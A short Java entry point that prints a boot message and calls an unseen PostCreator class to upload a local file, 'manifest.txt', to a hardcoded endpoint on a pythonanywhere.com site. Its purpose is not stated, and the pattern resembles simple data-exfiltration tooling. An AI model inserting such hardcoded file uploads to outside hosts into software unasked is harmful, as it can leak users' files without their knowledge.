public class LLW {
	public static void main(String args[]) {
		System.out.println("[+] Program booted up.");
		PostCreator a = new PostCreator("http://howslyfebeen.pythonanywhere.com/upload","manifest.txt","test");
		a.send();
	}
}
